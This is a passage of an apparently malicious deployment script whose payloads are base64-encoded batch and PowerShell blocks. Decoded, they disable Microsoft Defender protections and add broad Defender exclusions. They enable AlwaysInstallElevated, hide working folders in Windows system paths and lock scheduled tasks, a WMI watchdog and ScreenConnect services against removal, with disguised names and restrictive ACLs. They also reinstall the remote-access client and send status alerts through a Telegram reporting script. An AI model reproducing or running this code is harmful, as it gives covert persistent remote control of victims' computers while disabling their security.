CiAgZXhpdCAvYiAxCikKbW92ZSAveSAiJU1TSSUudG1wIiAiJU1TSSUiID5udWwgMj4mMQpjYWxs
IDpOb01zaVBvbGljeQpyZW0gTTEzOiBzdGFsZSBwcmltYXJ5IGRpciAoc2VydmljZSBkZWxldGVk
LCBwcm9kdWN0IHVucmVnaXN0ZXJlZCkgYnJlYWtzCnJlbSB0aGUgU0MgaW5zdGFsbGVyIGN1c3Rv
bSBhY3Rpb24gLSBjbGVhciBpdCBiZWZvcmUgaW5zdGFsbGluZwpzYyBxdWVyeSAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQppZiBlcnJvcmxldmVsIDEgaWYgZXhp
c3QgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgKAogIGVjaG8gc3Rh
bGVfcHJpbWFyeV9kaXJfY2xlYW4+PiIlTE9HJSIKICBybWRpciAvcyAvcSAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjEKKQplY2hvIFslVEFHJV0gbXNp
ZXhlYyBpbnN0YWxsPj4iJUxPRyUiCm1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCAv
TCp2ICIlV0QlXG1zaV9oZWFsLmxvZyIgPm51bCAyPiYxCnNldCAiTVNJRVhJVD0hRVJST1JMRVZF
TCEiCmVjaG8gWyVUQUclXSBtc2lleGVjIGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiCmNhbGwgOldh
aXRTdmMKZXhpdCAvYiAwCgo6UmVwYWlyUmVnaXN0ZXJlZApyZW0gJTE9ZmluZ2VycHJpbnQgLSBz
ZXJ2aWNlIGRlbGV0ZWQgYnV0IHByb2R1Y3QgcmVnaXN0ZXJlZDogcmVwYWlyIGJ5IEdVSUQuCnNj
IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJX4xKSIgPm51bCAyPiYxCmlmIG5vdCBlcnJv
cmxldmVsIDEgZXhpdCAvYiAwCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZXhpdCAv
YiAxCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGlj
eSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJX4x
IiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjEKY2FsbCA6V2FpdFN2YwpleGl0IC9iIDAK
CjpSZXN0b3JlQWx0CnJlbSBBTFQgc2VydmljZSBnb25lIGJ1dCBzdGlsbCByZWdpc3RlcmVkIChT
Qy1mYW1pbHkgbXNpZXhlYyBzaWRlIGVmZmVjdCkgLSByZXBhaXIgaXQgdG9vLgpzYyBxdWVyeSAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxCmlmIG5vdCBlcnJvcmxl
dmVsIDEgZXhpdCAvYiAwCmVjaG8gYWx0IG1pc3NpbmcgLSByZXBhaXIgYXR0ZW1wdD4+IiVMT0cl
IgppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBz
MSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0cl
IiAyPiYxCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQg
IlJVTk5JTkciID5udWwKaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkFMVF9PSz0xIgpleGl0IC9i
IDAKCjpOb01zaVBvbGljeQpyZWcgZGVsZXRlICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jv
c29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvZiA+bnVsIDI+JjEKcmVnIGRl
bGV0ZSAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIi
IC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNp
ZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09S
RCAvZCAwIC9mID5udWwgMj4mMQpleGl0IC9iIDAKCjpXYWl0U3ZjCnNldCAiVFJJRVM9MCIKOldh
aXRMb29wCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5k
ICJSVU5OSU5HIiA+bnVsCmlmIG5vdCBlcnJvcmxldmVsIDEgKAogIHNldCAiSU5TVEFMTEVEPTEi
CiAgc2V0ICJQUklNX09LPTEiCiAgZXhpdCAvYiAwCikKc2V0IC9hIFRSSUVTKz0xCmlmICVUUklF
UyUgR0VRIDEwIGV4aXQgL2IgMQpwaW5nIDEyNy4wLjAuMSAtbiA3ID5udWwgMj4mMQpnb3RvIDpX
YWl0TG9vcAoKOlRnU3RhdGUKc2V0ICJORVdTVEFURT0lfjEiCnNldCAiTVNHPSV+MiIKc2V0ICJP
TERTVEFURT0iCmlmIGV4aXN0ICIlU1RBVEUlIiBzZXQgL3AgT0xEU1RBVEU9PCIlU1RBVEUlIgpy
ZW0gcmF0ZS1saW1pdCByZXBlYXRlZCBET1dOL0ZBSUw6IG1heCAxIGFsZXJ0IHBlciAzMCBtaW4g
d2hpbGUgc3R1Y2sKaWYgL0kgIiVORVdTVEFURSUiPT0iRE9XTiIgZ290byA6TWF5YmVTdXBwcmVz
cwppZiAvSSAiJU5FV1NUQVRFJSI9PSJGQUlMIiBnb3RvIDpNYXliZVN1cHByZXNzCmdvdG8gOlNl
bmRBbGVydAo6TWF5YmVTdXBwcmVzcwppZiAvSSAiJU5FV1NUQVRFJSI9PSIlT0xEU1RBVEUlIiBp
ZiBleGlzdCAiJVdEJVx0Z19zZW50LmZsYWciICgKICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
bkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoTmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0g
LUxpdGVyYWxQYXRoICclV0QlXHRnX3NlbnQuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWlu
dXRlcyAtbHQgMzApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwgMj4mMQogIGlmIG5vdCBlcnJv
cmxldmVsIDEgKAogICAgZWNobyB0Z19zdXBwcmVzc2VkXyVORVdTVEFURSU+PiIlTE9HJSIKICAg
IGV4aXQgL2IgMAogICkKKQo6U2VuZEFsZXJ0CmVjaG8gJU5FV1NUQVRFJT4iJVNUQVRFJSIKZWNo
byBzZW50PiIlV0QlXHRnX3NlbnQuZmxhZyIKcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRl
cmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMx
IiAtU3RhdGUgJU5FV1NUQVRFJSAtU3VtbWFyeSAiJU1TRyUiIC1CdWlsZCAlTU9OVkVSJSAtQ291
bnQgJUNPVU5UJSA+bnVsIDI+JjEKZWNobyB0ZyBzdGF0ZSAlTkVXU1RBVEUlIHNlbnQ+PiIlTE9H
JSIKZXhpdCAvYiAwCg==
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM2IC0gaWRlbnRpdHktYXdh
cmUgdGFzayBBQ0wgKyBEaXNhYmxlTVNJIG5ldXRyYWxpemUgKyBleGNsdXNpb25zL0FDTDsgbm8g
YXR0ci1sb2NrIG9uIG11dGFibGUgcGF5bG9hZHMNCnNldGxvY2FsIEVuYWJsZUV4dGVuc2lvbnMg
RW5hYmxlRGVsYXllZEV4cGFuc2lvbg0Kc2V0ICJXRD0lUHJvZ3JhbURhdGElXE1pY3Jvc29mdFxX
aW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJXRDI9JVByb2dyYW1EYXRhJVxNaWNyb3Nv
ZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZSINCnNldCAiTE9HPSVXRCVcYm9vdC5lcnIiDQpz
ZXQgIlBSSU09U2NyZWVuQ29ubmVjdCBDbGllbnQgKDVmNjAxMDU3OTg1MmU1MDcpIg0Kc2V0ICJB
TFQ9U2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0MjcpIg0Kc2V0ICJLRUVQMT01
ZjYwMTA1Nzk4NTJlNTA3Ig0Kc2V0ICJLRUVQMj1mODYxYzgxNDBkNDUzNDI3Ig0Kc2V0ICJQRj0l
UHJvZ3JhbUZpbGVzJSINCnNldCAiUEY4Nj0lUHJvZ3JhbUZpbGVzKHg4NiklIg0Kc2V0ICJUQVNL
Uk9PVD0lU3lzdGVtUm9vdCVcU3lzdGVtMzJcVGFza3MiDQoNCmlmIG5vdCBleGlzdCAiJVdEJSIg
bWtkaXIgIiVXRCUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QyJSIgbWtkaXIgIiVXRDIl
IiA+bnVsIDI+JjENCmVjaG8gc2VjdXJlX2JlZ2luICVEQVRFJSAlVElNRSUgUzY+PiIlTE9HJSIN
Cg0KUkVNIC0tLSBOZXV0cmFsaXplIE1TSSBibG9jayBwb2xpY2llcyAoMTYyNSkgLS0tDQpSRU0g
RGlzYWJsZU1TSTogMD1hbGxvdywgMT1ub24tYWRtaW4gb25seSwgMj1hbGwgLT4gZm9yY2UgMA0K
cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3Yg
QWx3YXlzSW5zdGFsbEVsZXZhdGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVn
IGRlbGV0ZSAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0NVXFNPRlRXQVJFXFBv
bGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgQWx3YXlzSW5zdGFsbEVsZXZh
dGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KDQpSRU0gLS0tIERlZmVuZGVyOiBy
ZWdpc3RyeSBleGNsdXNpb25zIChwb2xpY3kgKyBwcmVmZXJlbmNlIGtleXMpIC0tLQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciIgL3Yg
RGlzYWJsZUFudGlTcHl3YXJlIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFs
LVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAvdCBSRUdfRFdP
UkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWlj
cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVC
ZWhhdmlvck1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwt
VGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlSU9BVlByb3RlY3Rpb24gL3QgUkVHX0RXT1JEIC9k
IDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlU2NyaXB0
U2Nhbm5pbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
V0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdB
UkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRDIl
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIkM6XFdpbmRv
d3NcVGVtcCIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
VEVNUCUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZU
V0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBG
JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5u
dWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAy
JSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYl
XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51
bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQ
MiUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMu
ZXhlIGN1cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNv
bm5lY3QuQ2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkg
ZG8gKA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
IDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2Vy
IHRoYW4gcmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVy
YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlv
blByZWZlcmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVu
Y2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURp
c2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJ
T0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5u
aW5nICR0cnVlfUNhdGNoe307IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2lu
ZG93c1xUZW1wJywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUp
JywnJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
UDIlKScpOyIgXg0KICAidHJ5eyRwYXRocys9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJv
Z3JhbUZpbGVzIC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEg
MCB8IEZvckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBm
ODY9W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRw
Zjg2KXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5D
b25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVs
bE5hbWV9KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1P
YmplY3QgLVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7
IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9y
ZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hl
bGwuZXhlJywnY2VydHV0aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScs
J1NjcmVlbkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4
Y2x1c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1
c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJF
TSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAt
LS0NCmNhbGwgOkxvY2tEaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0t
LSBoaWRlIHdvcmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVX
RCUiID5udWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6IGRv
IE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92
ZXIgK2ggK3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBhbmQgZnJvemUgdGhlIHdob2xlIGZs
ZWV0J3Mgc2VsZi11cGRhdGUuIEhpZGRlbiBkaXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4N
CmZvciAlJUYgaW4gKHBrZy5tc2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikg
ZG8gKA0KICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwg
Mj4mMQ0KKQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJkZXIgdG8gZGVs
ZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBjb250YWluIHNwYWNlcyAoIlNl
cnZlciBEaWFnbm9zdGljcyIpIC0gdGhlIGNtZCBGT1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50
byBnYXJiYWdlIHRva2Vucy4gUG93ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkg
aW5zdGVhZC4NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9
J1NpbGVudGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYoVGVzdC1QYXRoIC1MaXRl
cmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICcl
V0QlXGlkZW50aXR5LmNmZycgLUZvcmNlIHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2gg
J15UQVNLX1tBLURdPSguKykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0
YXJ0KCdcJykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnTWljcm9zb2Z0XFdpbmRvd3Nc
RGlhZ25vc2lzXFNjaGVkdWxlZCcsJ01pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXInLCdNaWNy
b3NvZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnLCdNaWNyb3NvZnRcV2luZG93c1xUY3Bp
cFxJcEFkZHJlc3NDb25mbGljdDEnKSB9OyIgXg0KICAiZm9yZWFjaCgkbiBpbiAkbmFtZXMpeyAk
ZiA9IEpvaW4tUGF0aCAnJVRBU0tST09UJScgJG47IGlmKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
JGYpeyAmIGljYWNscy5leGUgJGYgL2luaGVyaXRhbmNlOnIgfCBPdXQtTnVsbDsgJiBpY2FjbHMu
ZXhlICRmIC9ncmFudDpyICdOVCBBVVRIT1JJVFlcU1lTVEVNOkYnICdCVUlMVElOXEFkbWluaXN0
cmF0b3JzOkYnIHwgT3V0LU51bGw7ICYgYXR0cmliLmV4ZSAraCArcyAkZiB8IE91dC1OdWxsIH0g
fSIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBXTUkgd2F0Y2hkb2cgc3Vic2NyaXB0aW9uIGZp
bGVzIChjaGFpbiAyKSAtLS0NCmljYWNscyAiJVN5c3RlbVJvb3QlXFN5c3RlbTMyXHdiZW1cUmVw
b3NpdG9yeSIgL2dyYW50ICJOVCBBVVRIT1JJVFlcU1lTVEVNOkYiID5udWwgMj4mMQ0KDQpSRU0g
LS0tIEFDTDoga2VlcCBTY3JlZW5Db25uZWN0IGluc3RhbGwgZGlycyAob25jZTsgdGFrZW93biBl
dmVyeSB0aWNrIGlzIG5vaXN5KSAtLS0NCmlmIG5vdCBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxh
ZyIgKA0KICBmb3IgJSVEIGluICgNCiAgICAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtF
RVAxJSkiDQogICAgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIg0KICAgICIl
UEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICIlUEY4NiVcU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIg0KICApIGRvICgNCiAgICBpZiBleGlzdCAiJSV+RCIg
Y2FsbCA6TG9ja0RpciAiJSV+RCINCiAgKQ0KICBlY2hvIHNjX2xvY2tlZD4lV0QlXHNlY3VyZV9z
Yy5mbGFnDQopDQoNClJFTSAtLS0gU0Mgc2VydmljZXM6IFNZU1RFTSBjYW4gY29uZmlnL3N0b3Av
ZGVsZXRlOyBCQSBmdWxsOyB1c2VycyBibG9ja2VkIC0tLQ0KUkVNIFNZOiBDQyBEQyBMQyBTVyBS
UCBEVCBMTyBSQyAgKG5vIFNEIC0+IGNhbm5vdCBjaGFuZ2UgdGhpcyBTRCBpdHNlbGYpDQpzZXQg
IlNEPUQ6KEE7O0NDRENMQ1NXUlBXUERUTE9DUlJDOzs7U1kpKEE7O0NDRENMQ1NXUlBXUERUTE9D
UlNEUkNXRFdPOzs7QkEpIg0Kc2MuZXhlIHNkc2V0ICIlUFJJTSUiICIlU0QlIiA+bnVsIDI+JjEN
CnNjLmV4ZSBzZHNldCAiJUFMVCUiICIlU0QlIiA+bnVsIDI+JjENCnNjLmV4ZSBjb25maWcgIiVQ
UklNJSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgY29uZmlnICIlQUxUJSIgc3RhcnQ9
IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0gODY0MDAgYWN0
aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAgPm51bCAyPiYx
DQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzYw
MDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCg0KZWNobyBzZWN1cmVf
ZG9uZT4+IiVMT0clIg0KZXhpdCAvYiAwDQoNCjpMb2NrRGlyDQpzZXQgIlQ9JX4xIg0KaWYgbm90
IGV4aXN0ICIlVCUiIGV4aXQgL2IgMA0KUkVNIHRha2Ugb3duZXJzaGlwIHRoZW4gc3RyaXAgaW5o
ZXJpdGVkIEFDRXM7IFNZU1RFTStBZG1pbnMgb25seQ0KdGFrZW93biAvRiAiJVQlIiAvUiAvRCBZ
ID5udWwgMj4mMQ0KaWNhY2xzICIlVCUiIC9pbmhlcml0YW5jZTpyID5udWwgMj4mMQ0KaWNhY2xz
ICIlVCUiIC9ncmFudDpyICJOVCBBVVRIT1JJVFlcU1lTVEVNOihPSSkoQ0kpRiIgIkJVSUxUSU5c
QWRtaW5pc3RyYXRvcnM6KE9JKShDSSlGIiA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvcmVtb3Zl
OmcgIlVzZXJzIiAiQXV0aGVudGljYXRlZCBVc2VycyIgIkV2ZXJ5b25lIiAiTlQgQVVUSE9SSVRZ
XElOVEVSQUNUSVZFIiAiQlVJTFRJTlxVc2VycyIgPm51bCAyPiYxDQpleGl0IC9iIDANCg==
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4MDJUOSAtIGlk
ZW50aXR5LWF3YXJlIHRhc2tzICsgY29tcGFjdCBkaWdlc3QgbW9kZTsgLUZvcmNlIG9uIGhpZGRl
biBjYWNoZTsgd2lkZXIgbWFya2VyIGZpbHRlcg0KcGFyYW0oDQogICAgW1BhcmFtZXRlcihNYW5k
YXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kU3RhdGUsDQogICAgW3N0cmluZ10kU3VtbWFyeSA9ICcn
LA0KICAgIFtzdHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRv
d3NcV0VSXFRlbXBcLnd1Y2FjaGUnLA0KICAgIFtzdHJpbmddJE9sZFN0YXRlID0gJycsDQogICAg
W1ZhbGlkYXRlU2V0KCdyaWNoJywgJ2NvbXBhY3QnKV1bc3RyaW5nXSRNb2RlID0gJ3JpY2gnLA0K
ICAgIFtzdHJpbmddJEJ1aWxkID0gJ08xNScsDQogICAgW3N0cmluZ10kQ291bnQgPSAnMCcNCikN
